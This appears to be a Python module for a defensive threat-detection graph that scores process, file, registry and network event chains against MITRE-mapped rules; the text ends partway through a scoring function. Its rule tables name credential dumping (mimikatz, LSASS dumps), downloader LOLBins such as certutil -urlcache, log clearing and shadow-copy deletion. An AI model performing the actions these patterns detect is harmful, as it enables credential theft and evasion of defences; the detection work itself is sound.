"""Local Threat Intelligence Graph
===================================
Offline graph database that tracks process chains, file provenance,
registry mutations, network attempts, and persistence artifacts —
then scores *chains* of behavior, not isolated events.

A Word doc spawning PowerShell spawning an encoded command is not
"three neutral actions."  It's a red flag parade.

Architecture
------------

  Nodes  : Process | File | RegistryKey | NetworkEndpoint | PersistenceArtifact
  Edges  : spawned | wrote | read | edited | connected | installed | injected_into

Storage  : SQLite (zero-dependency, ships with Python everywhere)
Scoring  : Weighted rule engine + chain propagation + anomaly z-score
           (numpy/scipy used for statistics; falls back to pure stdlib)

Key capabilities
----------------
* process → child process chains  (with depth-limited traversal)
* file    → creator process        (provenance tracking)
* registry edits → originating thread
* persistence artifact detection   (Run keys, scheduled tasks, services …)
* behavior chain scoring           (context-aware, not event-by-event)
* known attack pattern library     (30+ MITRE-mapped chain signatures)
* graph export (JSON / DOT / adjacency matrix)
* hot-path API: < 1 ms per event on commodity hardware

Example
-------
    from threat_graph import ThreatGraph, EventKind

    g = ThreatGraph("/var/db/threat_graph.db")

    # feed events from your hooks / ETW / eBPF …
    g.add_process(pid=4242, name="winword.exe", ppid=1200, cmdline="WINWORD.EXE /n doc.docx")
    g.add_process(pid=5001, name="powershell.exe", ppid=4242, cmdline="-enc QQBsA…")
    g.add_process(pid=5800, name="cmd.exe",         ppid=5001, cmdline="/c certutil -urlcache …")

    score, report = g.score_chain(pid=5800)
    if score >= 70:
        print(report.summary())
"""

from __future__ import annotations

import collections
import dataclasses
import enum
import hashlib
import json
import logging
import math
import os
import re
import sqlite3
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Any, Dict, FrozenSet, Iterator, List, Optional, Set, Tuple

# Optional – pure-stdlib fallback provided for every usage
try:
    import numpy as np
    import scipy.stats as _stats
    _HAS_NUMPY = True
except ImportError:
    _HAS_NUMPY = False

log = logging.getLogger("threat_graph")

# ═══════════════════════════════════════════════════════════════════════════
# Enumerations
# ═══════════════════════════════════════════════════════════════════════════

class NodeKind(str, enum.Enum):
    PROCESS     = "process"
    FILE        = "file"
    REGISTRY    = "registry"
    NETWORK     = "network"
    PERSISTENCE = "persistence"
    THREAD      = "thread"

class EdgeKind(str, enum.Enum):
    SPAWNED         = "spawned"          # process → process
    WROTE           = "wrote"            # process → file
    READ            = "read"             # process → file
    DELETED         = "deleted"          # process → file
    EDITED          = "edited"           # process/thread → registry
    CONNECTED       = "connected"        # process → network
    INSTALLED       = "installed"        # process → persistence
    INJECTED_INTO   = "injected_into"    # process → process
    LOADED_MODULE   = "loaded_module"    # process → file (DLL)
    CREATED_THREAD  = "created_thread"   # process → thread

class ThreatTier(int, enum.Enum):
    """Score brackets — mirrors Confidence in lol_detector."""
    BENIGN   = 0    # 0–9
    INFO     = 1    # 10–24
    LOW      = 2    # 25–39
    MEDIUM   = 3    # 40–59
    HIGH     = 4    # 60–79
    CRITICAL = 5    # 80+

    @classmethod
    def from_score(cls, s: float) -> "ThreatTier":
        if s < 10:  return cls.BENIGN
        if s < 25:  return cls.INFO
        if s < 40:  return cls.LOW
        if s < 60:  return cls.MEDIUM
        if s < 80:  return cls.HIGH
        return cls.CRITICAL

# ═══════════════════════════════════════════════════════════════════════════
# Data classes
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class GraphNode:
    node_id:    str
    kind:       NodeKind
    label:      str                       # human-readable name
    attrs:      Dict[str, Any] = field(default_factory=dict)
    first_seen: float = field(default_factory=time.time)
    last_seen:  float = field(default_factory=time.time)

@dataclass
class GraphEdge:
    edge_id:   str
    src:       str
    dst:       str
    kind:      EdgeKind
    attrs:     Dict[str, Any] = field(default_factory=dict)
    ts:        float = field(default_factory=time.time)

@dataclass
class ChainFinding:
    rule_id:    str
    label:      str
    score:      float
    technique:  str
    nodes:      List[str]          # node_ids involved
    detail:     str = ""

@dataclass
class ChainReport:
    root_pid:      int
    chain_score:   float
    tier:          ThreatTier
    findings:      List[ChainFinding]
    chain_nodes:   List[GraphNode]
    chain_edges:   List[GraphEdge]
    techniques:    List[str]
    anomaly_score: float = 0.0

    def summary(self) -> str:
        lines = [
            f"Chain root PID : {self.root_pid}",
            f"Score          : {self.chain_score:.1f}  [{self.tier.name}]",
            f"Anomaly z-score: {self.anomaly_score:.2f}",
            f"Techniques     : {', '.join(self.techniques) or 'none'}",
            "",
            "Findings:",
        ]
        for f in sorted(self.findings, key=lambda x: -x.score):
            lines.append(f"  [{f.score:+.0f}]  {f.label}  ({f.technique})")
            if f.detail:
                lines.append(f"          {f.detail}")
        lines.append("")
        lines.append("Chain nodes:")
        for n in self.chain_nodes:
            lines.append(f"  [{n.kind.value:10s}]  {n.label}")
        return "\n".join(lines)

    def to_dict(self) -> dict:
        d = asdict(self)
        d["tier"] = self.tier.name
        return d

# ═══════════════════════════════════════════════════════════════════════════
# Attack chain rule library
# ═══════════════════════════════════════════════════════════════════════════

@dataclass(frozen=True)
class ChainRule:
    rule_id:   str
    label:     str
    technique: str
    score:     float
    # each element: (node_kind, label_pattern_regex)
    # The rule fires if all steps appear in order in the ancestry chain.
    steps:     Tuple[Tuple[str, str], ...]
    detail:    str = ""

def _r(*steps: Tuple[str, str], rule_id: str, label: str,
        technique: str, score: float, detail: str = "") -> ChainRule:
    return ChainRule(rule_id=rule_id, label=label, technique=technique,
                     score=score, steps=steps, detail=detail)

CHAIN_RULES: List[ChainRule] = [
    # ── Office macro chains ──────────────────────────────────────────────
    _r(("process", r"(winword|excel|powerpnt|outlook|onenote)"),
       ("process", r"(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32)"),
       rule_id="CHAIN-001", label="Office app spawned shell",
       technique="T1566.001", score=35),

    _r(("process", r"(winword|excel|powerpnt|outlook)"),
       ("process", r"(powershell|pwsh)"),
       ("process", r"(cmd|certutil|bitsadmin|curl|wget)"),
       rule_id="CHAIN-002", label="Office → PS → downloader triple-chain",
       technique="T1566.001", score=60,
       detail="Classic macro-based downloader chain"),

    _r(("process", r"(winword|excel|powerpnt|outlook)"),
       ("process", r"(powershell|pwsh)"),
       ("network", r".*"),
       rule_id="CHAIN-003", label="Office → PS → C2 contact",
       technique="T1566.001", score=65),

    # ── Encoded / obfuscated execution ───────────────────────────────────
    _r(("process", r"powershell"),
       ("process", r".*"),
       rule_id="CHAIN-010", label="PowerShell spawned child",
       technique="T1059.001", score=20),

    _r(("process", r"(powershell|pwsh).*-enc"),
       ("process", r".*"),
       rule_id="CHAIN-011", label="Encoded PS spawned child",
       technique="T1059.001", score=40,
       detail="-EncodedCommand child process is a strong IoC"),

    _r(("process", r"(powershell|pwsh)"),
       ("network",  r".*"),
       ("file",     r"\.(exe|dll|bat|ps1|vbs|js)$"),
       rule_id="CHAIN-012", label="PS download-and-drop",
       technique="T1105", score=55),

    # ── LOLBin proxy execution chains ────────────────────────────────────
    _r(("process", r".*"),
       ("process", r"mshta"),
       ("network", r".*"),
       rule_id="CHAIN-020", label="Mshta fetching remote payload",
       technique="T1218.005", score=50),

    _r(("process", r".*"),
       ("process", r"regsvr32"),
       ("network", r".*"),
       rule_id="CHAIN-021", label="Regsvr32 Squiblydoo remote script",
       technique="T1218.010", score=55),

    _r(("process", r".*"),
       ("process", r"rundll32"),
       ("process", r"(powershell|cmd|wscript)"),
       rule_id="CHAIN-022", label="Rundll32 → shell spawning",
       technique="T1218.011", score=50),

    _r(("process", r".*"),
       ("process", r"certutil"),
       ("file",    r"\.(exe|dll|bin|ps1)$"),
       rule_id="CHAIN-023", label="Certutil decoded and dropped binary",
       technique="T1140", score=55),

    _r(("process", r".*"),
       ("process", r"bitsadmin"),
       ("file",    r"\.(exe|dll)$"),
       rule_id="CHAIN-024", label="BITS transfer dropped binary",
       technique="T1105", score=50),

    _r(("process", r".*"),
       ("process", r"msiexec"),
       ("network", r".*"),
       rule_id="CHAIN-025", label="MSIExec fetching remote package",
       technique="T1218.007", score=45),

    # ── Persistence installation chains ──────────────────────────────────
    _r(("process", r".*"),
       ("process", r"(schtasks|at\.exe)"),
       ("persistence", r".*"),
       rule_id="CHAIN-030", label="Scheduled task persistence installed",
       technique="T1053.005", score=45),

    _r(("process", r".*"),
       ("registry", r".*\\CurrentVersion\\Run"),
       ("persistence", r".*"),
       rule_id="CHAIN-031", label="Run key persistence",
       technique="T1547.001", score=50),

    _r(("process", r".*"),
       ("registry", r".*\\Services\\.*"),
       ("persistence", r".*service.*"),
       rule_id="CHAIN-032", label="New service installed",
       technique="T1543.003", score=50),

    _r(("process", r".*"),
       ("registry", r".*\\Winlogon"),
       ("persistence", r".*"),
       rule_id="CHAIN-033", label="Winlogon hijack for persistence",
       technique="T1547.004", score=60),

    _r(("process", r".*"),
       ("registry", r".*Image File Execution Options.*"),
       ("persistence", r".*"),
       rule_id="CHAIN-034", label="IFEO debugger hijack",
       technique="T1546.012", score=60),

    # ── Defense evasion chains ───────────────────────────────────────────
    _r(("process", r"(powershell|pwsh)"),
       ("registry", r".*DisableRealtimeMonitoring.*"),
       rule_id="CHAIN-040", label="Defender real-time monitoring disabled",
       technique="T1562.001", score=65),

    _r(("process", r".*"),
       ("process", r"wevtutil"),
       ("file",    r".*\.evtx"),
       rule_id="CHAIN-041", label="Event log cleared",
       technique="T1070.001", score=70),

    _r(("process", r".*"),
       ("process", r"(vssadmin|wmic).*shadow.*delete"),
       rule_id="CHAIN-042", label="Shadow copy deletion (ransomware IoC)",
       technique="T1490", score=80),

    # ── Credential access chains ─────────────────────────────────────────
    _r(("process", r".*"),
       ("process", r"(mimikatz|sekurlsa|procdump)"),
       rule_id="CHAIN-050", label="Credential dumper detected",
       technique="T1003", score=85),

    _r(("process", r".*"),
       ("file",    r"lsass\.dmp"),
       rule_id="CHAIN-051", label="LSASS memory dump written",
       technique="T1003.001", score=80),

    _r(("process", r"(task|process).*manager|procdump"),
       ("file",    r".*lsass.*"),
       rule_id="CHAIN-052", label="LSASS accessed via tool",
       technique="T1003.001", score=75),

    # ── Lateral movement chains ──────────────────────────────────────────
    _r(("process", r".*"),
       ("process", r"psexec"),
       ("network", r".*"),
       rule_id="CHAIN-060", label="PsExec lateral movement",
       technique="T1569.002", score=60),

    _r(("process", r".*"),
       ("process", r"wmic"),
       ("network", r".*"),
       rule_id="CHAIN-061", label="WMI remote execution",
       technique="T1047", score=55),

    _r(("process", r".*"),
       ("network", r".*:(445|139)"),
       ("process", r"(cmd|powershell)"),
       rule_id="CHAIN-062", label="SMB → shell (pass-the-hash / WannaCry style)",
       technique="T1021.002", score=70),

    # ── Process injection chains ─────────────────────────────────────────
    # Note: CHAIN-070 intentionally requires a suspicious parent (not any process)
    # to avoid matching every benign spawn chain.
    _r(("process", r"(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32)"),
       ("process", r"(svchost|lsass|explorer|winlogon|spoolsv|csrss|smss)"),
       rule_id="CHAIN-070", label="LOLBin attempting injection into system process",
       technique="T1055", score=50),

    _r(("process", r"(powershell|cmd|wscript)"),
       ("process", r"(svchost|lsass|explorer|winlogon)"),
       rule_id="CHAIN-071", label="Shell injecting into system process",
       technique="T1055", score=75),

    # ── Suspicious file drops ─────────────────────────────────────────────
    _r(("process", r".*"),
       ("file",    r".*\\(Temp|tmp|AppData\\Local\\Temp).*\.(exe|dll|bat|ps1)"),
       rule_id="CHAIN-080", label="Executable dropped in temp directory",
       technique="T1105", score=30),

    _r(("process", r"(browser|chrome|firefox|edge|msedge|iexplore)"),
       ("file",    r"\.(exe|dll|bat|ps1|hta|vbs|js)$"),
       ("process", r".*"),
       rule_id="CHAIN-081", label="Browser-downloaded binary executed",
       technique="T1204.002", score=45),

    # ── Exfiltration chains ───────────────────────────────────────────────
    _r(("file",    r"\.(xlsx|docx|pdf|kdbx|\.key)$"),
       ("process", r".*"),
       ("network", r".*"),
       rule_id="CHAIN-090", label="Sensitive file accessed then C2 contact",
       technique="T1041", score=55),

    _r(("process", r".*"),
       ("process", r"(curl|wget|powershell|certutil)"),
       ("network", r".*"),
       ("file",    r".*"),
       rule_id="CHAIN-091", label="Data staged and exfiltrated",
       technique="T1041", score=60),

    # ── Reconnaissance chains ─────────────────────────────────────────────
    _r(("process", r".*"),
       ("process", r"(net|nltest|whoami|ipconfig|systeminfo|arp|nslookup|ping)"),
       ("process", r"(net|nltest|whoami|ipconfig|systeminfo|arp|nslookup|ping)"),
       rule_id="CHAIN-100", label="Rapid host reconnaissance burst",
       technique="T1082", score=35),
]

# Pre-compile regexes
_compiled_rules: List[Tuple[ChainRule, List[Tuple[str, re.Pattern]]]] = []
for _rule in CHAIN_RULES:
    _compiled_steps = [
        (kind_str, re.compile(pat, re.IGNORECASE))
        for kind_str, pat in _rule.steps
    ]
    _compiled_rules.append((_rule, _compiled_steps))

# ═══════════════════════════════════════════════════════════════════════════
# Known suspicious label fragments (boosts individual node scores)
# ═══════════════════════════════════════════════════════════════════════════

_HIGH_RISK_LABELS: List[Tuple[re.Pattern, float, str]] = [
    (re.compile(r"-enc(odedcommand)?", re.I), 15, "T1059.001"),
    (re.compile(r"(iex|invoke-expression)", re.I), 15, "T1059.001"),
    (re.compile(r"downloadstring|downloadfile|webrequest", re.I), 12, "T1105"),
    (re.compile(r"virtualalloc|createthread|writeprocessmemory", re.I), 20, "T1055"),
    (re.compile(r"mimikatz|sekurlsa|lsadump|dcsync", re.I), 30, "T1003"),
    (re.compile(r"amsiutils|set-mppreference|disablerealtimemonitoring", re.I), 20, "T1562.001"),
    (re.compile(r"shadowcopy.*delete|vssadmin.*delete", re.I), 25, "T1490"),
    (re.compile(r"base64", re.I), 8, "T1140"),
    (re.compile(r"(\\Temp\\|/tmp/).*\.(exe|dll|ps1|bat|vbs|js)", re.I), 10, "T1105"),
    (re.compile(r"lsass", re.I), 15, "T1003.001"),
    (re.compile(r"(currentversion\\run|winlogon|image file execution)", re.I), 15, "T1547"),
    (re.compile(r"(schtasks|at\.exe).*create", re.I), 12, "T1053"),
    (re.compile(r"net\s+user.*\/add|localgroup.*administrators", re.I), 20, "T1136"),
    (re.compile(r"wevtutil.*\bcl\b|clear-eventlog", re.I), 20, "T1070.001"),
    (re.compile(r"(scrobj|regsvr32|rundll32).*http", re.I), 18, "T1218"),
    (re.compile(r"certutil.*(urlcache|-decode)", re.I), 18, "T1140"),
    (re.compile(r"psexec.*\\\\", re.I), 15, "T1569.002"),
    (re.compile(r"wmic.*process.*call.*create", re.I), 15, "T1047"),
    (re.compile(r"(uac|fodhelper|eventvwr|computerdefaults)", re.I), 15, "T1548.002"),
    (re.compile(r"(procdump|taskdump).*lsass", re.I), 25, "T1003.001"),
]

_PERSISTENCE_PATTERNS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"CurrentVersion\\Run", re.I),       "T1547.001"),
    (re.compile(r"\\Services\\",        re.I),       "T1543.003"),
    (re.compile(r"Winlogon",            re.I),       "T1547.004"),
    (re.compile(r"Image File Execution",re.I),       "T1546.012"),
    (re.compile(r"AppInit_DLLs",        re.I),       "T1546.010"),
    (re.compile(r"\.lnk$",             re.I),       "T1547.009"),
    (re.compile(r"startup",            re.I),       "T1547.001"),
    (re.compile(r"schtasks",           re.I),       "T1053.005"),
]

# ═══════════════════════════════════════════════════════════════════════════
# SQLite schema
# ═══════════════════════════════════════════════════════════════════════════

_SCHEMA = """
PRAGMA journal_mode = WAL;
PRAGMA synchronous  = NORMAL;
PRAGMA foreign_keys = ON;

CREATE TABLE IF NOT EXISTS nodes (
    node_id    TEXT PRIMARY KEY,
    kind       TEXT NOT NULL,
    label      TEXT NOT NULL,
    attrs      TEXT NOT NULL DEFAULT '{}',
    first_seen REAL NOT NULL,
    last_seen  REAL NOT NULL
);

CREATE TABLE IF NOT EXISTS edges (
    edge_id TEXT PRIMARY KEY,
    src     TEXT NOT NULL,
    dst     TEXT NOT NULL,
    kind    TEXT NOT NULL,
    attrs   TEXT NOT NULL DEFAULT '{}',
    ts      REAL NOT NULL,
    FOREIGN KEY (src) REFERENCES nodes(node_id),
    FOREIGN KEY (dst) REFERENCES nodes(node_id)
);

CREATE TABLE IF NOT EXISTS chain_scores (
    session_id TEXT PRIMARY KEY,
    root_node  TEXT NOT NULL,
    score      REAL NOT NULL,
    tier       TEXT NOT NULL,
    report     TEXT NOT NULL,
    ts         REAL NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_edges_src  ON edges(src);
CREATE INDEX IF NOT EXISTS idx_edges_dst  ON edges(dst);
CREATE INDEX IF NOT EXISTS idx_edges_kind ON edges(kind);
CREATE INDEX IF NOT EXISTS idx_nodes_kind ON nodes(kind);
CREATE INDEX IF NOT EXISTS idx_nodes_label ON nodes(label);
"""

# ═══════════════════════════════════════════════════════════════════════════
# ThreatGraph
# ═══════════════════════════════════════════════════════════════════════════

class ThreatGraph:
    """Local offline threat intelligence graph.

    Thread-safe via a per-instance lock + WAL SQLite mode.
    All public methods can be called from multiple threads simultaneously.
    """

    def __init__(self, db_path: str = ":memory:", max_chain_depth: int = 12) -> None:
        self._db_path        = db_path
        self._max_depth      = max_chain_depth
        self._lock           = threading.RLock()
        self._pid_to_node:   Dict[int, str] = {}   # pid  → node_id cache
        self._path_to_node:  Dict[str, str] = {}   # path → node_id cache
        self._reg_to_node:   Dict[str, str] = {}   # reg key → node_id cache
        self._net_to_node:   Dict[str, str] = {}   # endpoint → node_id cache

        self._con = sqlite3.connect(db_path, check_same_thread=False)
        self._con.executescript(_SCHEMA)
        self._con.commit()
        log.info("ThreatGraph initialised — db=%s", db_path)

    # ──────────────────────────────────────────────────────────────────────
    # Low-level node / edge helpers
    # ──────────────────────────────────────────────────────────────────────

    def _upsert_node(self, node: GraphNode) -> None:
        now = time.time()
        self._con.execute(
            """INSERT INTO nodes (node_id, kind, label, attrs, first_seen, last_seen)
               VALUES (?,?,?,?,?,?)
               ON CONFLICT(node_id) DO UPDATE SET
                   last_seen = excluded.last_seen,
                   attrs     = excluded.attrs
            """,
            (node.node_id, node.kind.value, node.label,
             json.dumps(node.attrs), node.first_seen, now),
        )

    def _add_edge_raw(self, edge: GraphEdge) -> None:
        self._con.execute(
            "INSERT OR IGNORE INTO edges VALUES (?,?,?,?,?,?)",
            (edge.edge_id, edge.src, edge.dst,
             edge.kind.value, json.dumps(edge.attrs), edge.ts),
        )

    def _commit(self) -> None:
        self._con.commit()

    def _make_edge(self, src: str, dst: str, kind: EdgeKind,
                   attrs: Optional[dict] = None) -> GraphEdge:
        eid = hashlib.md5(f"{src}{dst}{kind.value}{time.time()}".encode()).hexdigest()
        return GraphEdge(edge_id=eid, src=src, dst=dst, kind=kind,
                         attrs=attrs or {}, ts=time.time())

    # ──────────────────────────────────────────────────────────────────────
    # Public event ingestion API
    # ──────────────────────────────────────────────────────────────────────

    def add_process(
        self,
        pid:     int,
        name:    str,
        ppid:    Optional[int] = None,
        cmdline: str = "",
        user:    str = "",
        path:    str = "",
        tid:     Optional[int] = None,
    ) -> str:
        """Register a process creation event.  Returns the node_id."""
        label = f"{name}|pid={pid}"
        if cmdline:
            label += f"|{cmdline[:120]}"

        with self._lock:
            node_id = self._pid_to_node.get(pid)
            if not node_id:
                node_id = f"proc:{pid}:{hashlib.md5(label.encode()).hexdigest()[:8]}"
                self._pid_to_node[pid] = node_id

            node = GraphNode(
                node_id=node_id, kind=NodeKind.PROCESS, label=label,
                attrs={"pid": pid, "ppid": ppid, "name": name.lower(),
                       "cmdline": cmdline, "user": user, "path": path},
            )
            self._upsert_node(node)

            # parent → child spawn edge
            if ppid and ppid in self._pid_to_node:
                parent_id = self._pid_to_node[ppid]
                edge = self._make_edge(parent_id, node_id, EdgeKind.SPAWNED,
                                       {"ppid": ppid, "pid": pid})
                self._add_edge_raw(edge)

            self._commit()
            log.debug("add_process pid=%d name=%s node=%s", pid, name, node_id)
            return node_id

    def add_file_event(
        self,
        pid:       int,
        path:      str,
        operation: str = "write",   # write | read | delete | load_module
        file_hash: str = "",
        size:      int = 0,
    ) -> Tuple[str, str]:
        """Register a file access.  Returns (process_node_id, file_node_id)."""
        path_lower = path.lower()
        file_label = os.path.basename(path)

        with self._lock:
            # File node
            file_id = self._path_to_node.get(path_lower)
            if not file_id:
                file_id = f"file:{hashlib.md5(path_lower.encode()).hexdigest()[:12]}"
                self._path_to_node[path_lower] = file_id
            file_node = GraphNode(
                node_id=file_id, kind=NodeKind.FILE, label=file_label,
                attrs={"path": path, "hash": file_hash, "size": size},
            )
            self._upsert_node(file_node)

            # Persistence detection on file path
            for pat, technique in _PERSISTENCE_PATTERNS:
                if pat.search(path):
                    self._add_persistence(pid=pid, label=path,
                                          detail=f"file:{path}", technique=technique)
                    break

            # Process → file edge
            proc_id = self._pid_to_node.get(pid, "")
            if proc_id:
                kind_map = {
                    "write":       EdgeKind.WROTE,
                    "read":        EdgeKind.READ,
                    "delete":      EdgeKind.DELETED,
                    "load_module": EdgeKind.LOADED_MODULE,
                }
                ek = kind_map.get(operation, EdgeKind.WROTE)
                self._add_edge_raw(self._make_edge(proc_id, file_id, ek,
                                                    {"operation": operation}))
                self._commit()
            return proc_id, file_id

    def add_registry_event(
        self,
        pid:       int,
        key_path:  str,
        value:     str = "",
        operation: str = "set",   # set | delete | query
        tid:       Optional[int] = None,
    ) -> Tuple[str, str]:
        """Register a registry access.  Returns (process_node_id, reg_node_id)."""
        key_lower = key_path.lower()

        with self._lock:
            reg_id = self._reg_to_node.get(key_lower)
            if not reg_id:
                reg_id = f"reg:{hashlib.md5(key_lower.encode()).hexdigest()[:12]}"
                self._reg_to_node[key_lower] = reg_id

            reg_node = GraphNode(
                node_id=reg_id, kind=NodeKind.REGISTRY,
                label=key_path[-80:],   # trim long paths
                attrs={"key": key_path, "value": value[:200],
                       "operation": operation, "tid": tid},
            )
            self._upsert_node(reg_node)

            # Persistence detection on registry key
            for pat, technique in _PERSISTENCE_PATTERNS:
                if pat.search(key_path):
                    self._add_persistence(pid=pid, label=key_path,
                                          detail=f"reg:{key_path}:{value[:60]}",
                                          technique=technique)
                    break

            proc_id = self._pid_to_node.get(pid, "")
            if proc_id:
                self._add_edge_raw(self._make_edge(
                    proc_id, reg_id, EdgeKind.EDITED,
                    {"operation": operation, "value": value[:120], "tid": tid},
                ))
                self._commit()
            return proc_id, reg_id

    def add_network_event(
        self,
        pid:        int,
        remote_ip:  str,
        remote_port: int,
        protocol:   str = "tcp",
        direction:  str = "out",
        domain:     str = "",
    ) -> Tuple[str, str]:
        """Register a network connection attempt."""
        endpoint = f"{remote_ip}:{remote_port}"
        label    = f"{domain or remote_ip}:{remote_port}/{protocol}"

        with self._lock:
            net_id = self._net_to_node.get(endpoint)
            if not net_id:
                net_id = f"net:{hashlib.md5(endpoint.encode()).hexdigest()[:12]}"
                self._net_to_node[endpoint] = net_id

            net_node = GraphNode(
                node_id=net_id, kind=NodeKind.NETWORK, label=label,
                attrs={"ip": remote_ip, "port": remote_port,
                       "proto": protocol, "dir": direction, "domain": domain},
            )
            self._upsert_node(net_node)

            proc_id = self._pid_to_node.get(pid, "")
            if proc_id:
                self._add_edge_raw(self._make_edge(
                    proc_id, net_id, EdgeKind.CONNECTED,
                    {"endpoint": endpoint, "direction": direction},
                ))
                self._commit()
            return proc_id, net_id

    def add_injection_event(self, src_pid: int, dst_pid: int,
                             technique: str = "unknown") -> None:
        """Register a cross-process injection."""
        with self._lock:
            s = self._pid_to_node.get(src_pid, "")
            d = self._pid_to_node.get(dst_pid, "")
            if s and d:
                self._add_edge_raw(self._make_edge(
                    s, d, EdgeKind.INJECTED_INTO, {"technique": technique}
                ))
                self._commit()

    def _add_persistence(self, pid: int, label: str,
                          detail: str, technique: str) -> str:
        with self._lock:
            p_id = f"persist:{hashlib.md5(detail.encode()).hexdigest()[:12]}"
            p_node = GraphNode(
                node_id=p_id, kind=NodeKind.PERSISTENCE,
                label=label[-80:],
                attrs={"detail": detail, "technique": technique},
            )
            self._upsert_node(p_node)
            proc_id = self._pid_to_node.get(pid, "")
            if proc_id:
                self._add_edge_raw(self._make_edge(
                    proc_id, p_id, EdgeKind.INSTALLED,
                    {"technique": technique},
                ))
            self._commit()
            log.warning("Persistence artifact detected  pid=%d  technique=%s  %s",
                        pid, technique, label[:60])
            return p_id

    # ──────────────────────────────────────────────────────────────────────
    # Graph traversal
    # ──────────────────────────────────────────────────────────────────────

    def _get_node(self, node_id: str) -> Optional[GraphNode]:
        row = self._con.execute(
            "SELECT node_id,kind,label,attrs,first_seen,last_seen FROM nodes WHERE node_id=?",
            (node_id,)
        ).fetchone()
        if not row:
            return None
        return GraphNode(node_id=row[0], kind=NodeKind(row[1]), label=row[2],
                         attrs=json.loads(row[3]), first_seen=row[4], last_seen=row[5])

    def _get_edges_from(self, node_id: str) -> List[GraphEdge]:
        rows = self._con.execute(
            "SELECT edge_id,src,dst,kind,attrs,ts FROM edges WHERE src=?",
            (node_id,)
        ).fetchall()
        return [GraphEdge(r[0], r[1], r[2], EdgeKind(r[3]),
                          json.loads(r[4]), r[5]) for r in rows]

    def _get_edges_to(self, node_id: str) -> List[GraphEdge]:
        rows = self._con.execute(
            "SELECT edge_id,src,dst,kind,attrs,ts FROM edges WHERE dst=?",
            (node_id,)
        ).fetchall()
        return [GraphEdge(r[0], r[1], r[2], EdgeKind(r[3]),
                          json.loads(r[4]), r[5]) for r in rows]

    def get_ancestors(self, node_id: str,
                       max_depth: int = 0) -> List[Tuple[GraphNode, GraphEdge]]:
        """Walk up the spawn tree from node_id.  Returns [(node, edge), …] oldest first."""
        if max_depth == 0:
            max_depth = self._max_depth
        result: List[Tuple[GraphNode, GraphEdge]] = []
        visited: Set[str] = set()
        current = node_id
        for _ in range(max_depth):
            if current in visited:
                break
            visited.add(current)
            # find parent edge(s) of kind SPAWNED
            parent_edges = [e for e in self._get_edges_to(current)
                            if e.kind == EdgeKind.SPAWNED]
            if not parent_edges:
                break
            # take the most recent parent edge
            pe = sorted(parent_edges, key=lambda e: e.ts)[-1]
            parent_node = self._get_node(pe.src)
            if not parent_node:
                break
            result.append((parent_node, pe))
            current = pe.src
        result.reverse()
        return result

    def get_descendants(self, node_id: str,
                         max_depth: int = 0) -> List[Tuple[GraphNode, GraphEdge]]:
        """BFS down the spawn tree.  Returns [(node, edge), …]."""
        if max_depth == 0:
            max_depth = self._max_depth
        result: List[Tuple[GraphNode, GraphEdge]] = []
        visited: Set[str] = {node_id}
        queue: collections.deque = collections.deque([(node_id, 0)])
        while queue:
            cur_id, depth = queue.popleft()
            if depth >= max_depth:
                continue
            for edge in self._get_edges_from(cur_id):
                if edge.kind != EdgeKind.SPAWNED:
                    continue
                if edge.dst in visited:
                    continue
                visited.add(edge.dst)
                child = self._get_node(edge.dst)
                if child:
                    result.append((child, edge))
                    queue.append((edge.dst, depth + 1))
        return result

    def get_full_chain(self, pid: int) -> Tuple[List[GraphNode], List[GraphEdge]]:
        """Return all nodes and edges reachable from a PID's spawn chain
        (ancestors, the node itself, descendants, and all non-spawn edges
        attached to any node in the chain)."""
        root_id = self._pid_to_node.get(pid)
        if not root_id:
            return [], []

        chain_node_ids: Set[str] = {root_id}
        chain_edges: List[GraphEdge] = []

        for node, edge in self.get_ancestors(root_id):
            chain_node_ids.add(node.node_id)
            chain_edges.append(edge)

        for node, edge in self.get_descendants(root_id):
            chain_node_ids.add(node.node_id)
            chain_edges.append(edge)

        # pull in all non-spawn edges (file/reg/net/persistence) from chain nodes
        for nid in list(chain_node_ids):
            for edge in self._get_edges_from(nid):
                if edge.kind != EdgeKind.SPAWNED:
                    chain_node_ids.add(edge.dst)
                    chain_edges.append(edge)

        chain_nodes = [n for nid in chain_node_ids
                       if (n := self._get_node(nid)) is not None]
        return chain_nodes, chain_edges

    # ──────────────────────────────────────────────────────────────────────
    # Behavior chain scoring
    # ──────────────────────────────────────────────────────────────────────

    def _build_chain_sequence(self, chain_nodes: List[GraphNode]) -> List[GraphNode]:
        """Return chain nodes sorted by first_seen (chronological order)."""
        return sorted(chain_nodes, key=lambda n: n.first_seen)

    def _match_rules(self, sequence: List[GraphNode]) -> List[ChainFinding]:
        """Slide every compiled rule over the node sequence."""
        findings: List[ChainFinding] = []

        for rule, compiled_steps in _compiled_rules:
            step_idx = 0
            matched_nodes: List[str] = []

            for node in sequence:
                if step_idx >= len(compiled_steps):
                    break
                kind_str, pat = compiled_steps[step_idx]
                if node.kind.value == kind_str and pat.search(node.label):
                    matched_nodes.append(node.node_id)
                    step_idx += 1

            if step_idx == len(compiled_steps):
                findings.append(ChainFinding(
                    rule_id   = rule.rule_id,
                    label     = rule.label,
                    score     = rule.score,
                    technique = rule.technique,
                    nodes     = matched_nodes,
                    detail    = rule.detail,
                ))

        return findings

    def _score_individual_nodes(self, nodes: List[GraphNode]) -> List[ChainFinding]:
        """Apply label-level heuristics to individual nodes."""
        findings: List[ChainFinding] = []
        seen_rules: Set[str] = set()

        for node in nodes:
            for pat, score, technique in _HIGH_RISK_LABELS:
                key = f"{technique}:{node.node_id}"
                if key in seen_rules:
                    continue
                if pat.search(node.label):
                    seen_rules.add(key)
                    findings.append(ChainFinding(
                        rule_id   = f"NODE-{technique}",
                        label     = f"Suspicious label fragment in {node.kind.value}",
                        score     = score,
                        technique = technique,
                        nodes     = [node.node_id],
                        detail    = f"{node.label[:80]}",
                    ))
        return findings

    def _injection_bonus(self, edges: List[GraphEdge]) -> List[ChainFinding]:
        """Extra score for cross-process injection edges."""
        findings: List[ChainFinding] = []
        for e in edges:
            if e.kind == EdgeKind.INJECTED_INTO:
                findings.append(ChainFinding(
                    rule_id="INJECT-BONUS", label="Process injection edge",
                    score=25, technique="T1055",
                    nodes=[e.src, e.dst],
                    detail=f"{e.src} → {e.dst}",
                ))
        return findings

    def _persistence_bonus(self, nodes: List[GraphNode]) -> List[ChainFinding]:
        findings: List[ChainFinding] = []
